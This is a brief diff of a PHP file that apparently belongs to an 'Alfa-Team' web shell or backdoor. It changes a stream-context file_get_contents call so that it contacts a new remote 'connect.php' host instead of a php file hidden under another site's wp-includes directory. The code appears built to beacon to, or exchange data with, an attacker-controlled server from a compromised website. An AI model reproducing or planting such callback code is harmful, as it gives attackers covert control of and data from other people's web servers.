@@ -18,7 +18,7 @@ $options = array(
 );
 
 $context  = stream_context_create($options);
-$result = file_get_contents('https://brightinstitute.edu.pk/wp-includes/css/global.php', false, $context);
+$result = file_get_contents('http://preydev.wuaze.com/anhphongdepchai/connect.php', false, $context);
 /*
 	Author: 	Solevisible/Alfa-Team
 	Telegram: 	https://telegram.me/solevisible
